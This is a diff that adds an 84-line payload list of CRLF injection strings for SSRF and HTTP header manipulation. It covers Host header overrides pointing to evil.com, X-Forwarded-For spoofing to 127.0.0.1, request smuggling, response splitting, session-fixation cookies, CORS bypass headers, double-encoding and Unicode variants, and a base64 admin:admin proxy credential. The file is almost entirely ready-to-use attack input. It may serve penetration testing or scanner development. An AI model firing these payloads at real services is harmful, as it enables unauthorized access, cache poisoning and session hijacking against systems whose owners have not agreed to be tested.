@@ -1,0 +1,84 @@
+# CRLF Injection Payloads for SSRF
+# These inject newlines to manipulate HTTP requests
+
+# Basic CRLF injection
+%0d%0aHost:%20evil.com
+%0d%0aX-Forwarded-For:%20127.0.0.1
+%0d%0aX-Forwarded-Host:%20evil.com
+%0d%0aX-Original-URL:%20/admin
+
+# Double CRLF (end headers, start body)
+%0d%0a%0d%0a
+%0d%0a%0d%0aGET%20/admin%20HTTP/1.1
+
+# Header injection
+%0d%0aContent-Length:%200%0d%0a%0d%0a
+%0d%0aSet-Cookie:%20admin=true
+
+# URL encoded variations
+%0aHost:%20evil.com
+%0dHost:%20evil.com
+%0d%0a%20Host:%20evil.com
+
+# Unicode variations
+%E5%98%8A%E5%98%8DHost:%20evil.com
+%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D
+
+# Mixed encoding
+%250d%250aHost:%20evil.com
+%25250d%25250aHost:%20evil.com
+
+# With different headers
+%0d%0aAuthorization:%20Bearer%20admin
+%0d%0aX-Real-IP:%20127.0.0.1
+%0d%0aX-Client-IP:%20127.0.0.1
+%0d%0aX-Remote-IP:%20127.0.0.1
+%0d%0aX-Remote-Addr:%20127.0.0.1
+%0d%0aX-ProxyUser-Ip:%20127.0.0.1
+
+# HTTP Request Smuggling
+%0d%0aTransfer-Encoding:%20chunked
+%0d%0aContent-Length:%2050
+
+# Response splitting
+%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html
+
+# Null byte combinations
+%00%0d%0aHost:%20evil.com
+%0d%0a%00Host:%20evil.com
+
+# Tab and space variations
+%09Host:%20evil.com
+%20Host:%20evil.com
+%0d%0a%09Host:%20evil.com
+
+# Multiple header injection
+%0d%0aHost:%20evil.com%0d%0aX-Forwarded-For:%20127.0.0.1
+
+# Protocol downgrade
+%0d%0aConnection:%20close%0d%0aUpgrade:%20h2c
+
+# Cache poisoning
+%0d%0aX-Forwarded-Scheme:%20http
+%0d%0aX-Forwarded-Proto:%20http
+
+# Session fixation
+%0d%0aSet-Cookie:%20sessionid=admin123
+
+# CORS bypass
+%0d%0aAccess-Control-Allow-Origin:%20*
+%0d%0aAccess-Control-Allow-Credentials:%20true
+
+# WebSocket upgrade injection
+%0d%0aUpgrade:%20websocket%0d%0aConnection:%20Upgrade
+
+# HTTP/2 smuggling
+%0d%0aHTTP2-Settings:%20AAEAAEAAAAIAAAABAAMAAABkAAQBAAAAAAUAAEAA
+
+# Proxy header injection
+%0d%0aProxy-Authorization:%20Basic%20YWRtaW46YWRtaW4=
+%0d%0aVia:%201.1%20evil.com
+
+# Custom headers for bypass
+%0d%0aX-Original-Host:%20127.0.0.1
+%0d%0aX-Rewrite-URL:%20/admin
